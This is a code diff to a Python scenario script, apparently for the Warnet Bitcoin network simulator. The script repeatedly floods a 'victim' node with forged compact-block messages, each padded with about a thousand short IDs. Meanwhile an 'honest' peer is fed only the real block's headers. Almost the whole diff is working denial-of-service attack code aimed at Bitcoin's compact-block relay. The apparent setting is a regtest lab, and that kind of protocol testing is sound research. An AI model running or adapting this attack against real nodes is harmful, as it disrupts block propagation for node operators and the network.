@@ -17,10 +17,13 @@ from test_framework.blocktools import (
 # The entire Bitcoin Core test_framework directory is available as a library
 from test_framework.messages import (
     CBlockHeader,
-    P2PHeaderAndShortIDs,
+    CInv,
+    HeaderAndShortIDs,
+    msg_block,
     msg_cmpctblock,
-
+    msg_headers,
 )
+
 from test_framework.p2p import (
     P2PInterface,
 )
@@ -41,14 +44,32 @@ class CmpctAtk(Commander):
         )
         parser.usage = "warnet run scenarios/cmpctatk.py"
 
+
+
+    def connect_to_hostname(self, hostname):
+        # regtest or signet
+        chain = self.nodes[0].chain
+
+        # The victim's address could be an explicit IP address
+        # OR a kubernetes hostname (use default chain p2p port)
+        dstaddr = socket.gethostbyname(hostname)
+        if chain == "regtest":
+            dstport = 18444
+
+        conn = P2PInterface()
+        conn.peer_connect(
+            dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
+        )()
+        conn.wait_until(lambda: conn.is_connected, check_connected=False)
+        return conn
+
     def build_block_on_tip(self, node):
         block = create_block(tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS))
         block.solve()
         return block
 
-    def build_fat_empty_cmpct(self, node):
-        block = self.build_block_on_tip(node)
-        cmpct_block = P2PHeaderAndShortIDs()
+    def build_fat_empty_cmpct(self, block):
+        cmpct_block = HeaderAndShortIDs()
         cmpct_block.header = CBlockHeader(block)
 
         for i in range(1_000):
@@ -59,40 +80,45 @@ class CmpctAtk(Commander):
 
     def run_test(self):
         victim = "tank1"
-
-        # regtest or signet
-        chain = self.nodes[0].chain
-
-        # The victim's address could be an explicit IP address
-        # OR a kubernetes hostname (use default chain p2p port)
-        dstaddr = socket.gethostbyname(victim)
-        if chain == "regtest":
-            dstport = 18444
+        honest = "tank2"
 
         # Now we will use a python-based Bitcoin p2p node to send very specific,
         # unusual or non-standard messages to a "victim" node.
         self.log.info(f"Attacking {victim}")
         attackers = []
         for i in range(3):
-            attacker = P2PInterface()
-            attacker.peer_connect(
-                dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
-            )()
-            attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
-            attackers.append(attacker)
+            attackers.append(self.connect_to_hostname(victim))
 
-        attack_block = self.build_fat_empty_cmpct(self.nodes[0])
-        attack_block_msg = msg_cmpctblock(attack_block)
+        honestpeer = self.connect_to_hostname(honest)
+
+        real_block = self.build_block_on_tip(self.nodes[0])
+        attack_block = self.build_fat_empty_cmpct(real_block)
+        attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
         next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
         while True:
             now = datetime.now()
             if now > next_block_interrupt_time:
-                attack_block = self.build_fat_empty_cmpct(self.nodes[0])
-                attack_block_msg = msg_cmpctblock(attack_block)
+                real_block = self.build_block_on_tip(self.nodes[0])
+                attack_block = self.build_fat_empty_cmpct(real_block)
+                attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                 next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
 
-            for attacker in attackers:
-                attacker.send_message(attack_block_msg)
+            for victim_conn in attackers:
+                victim_conn.send_message(attack_block_msg)
+
+            honestpeer_getdata = honestpeer.last_message.get("getdata")
+            if honestpeer_getdata is not None:
+                print(f"Inv hash: {honestpeer_getdata.inv[0].hash}")
+                print(f"expected hash: {real_block.hash}")
+
+            if honestpeer_getdata is not None and any(inv.hash == real_block.hash for inv in honestpeer_getdata.inv):
+                print("This never happens!")
+                honestpeer.send_and_ping(msg_block(real_block))
+            else:
+                headers_message = msg_headers()
+                headers_message.headers = [CBlockHeader(real_block)]
+                honestpeer.send_message(headers_message)
+
 
 def main():
     CmpctAtk().main()
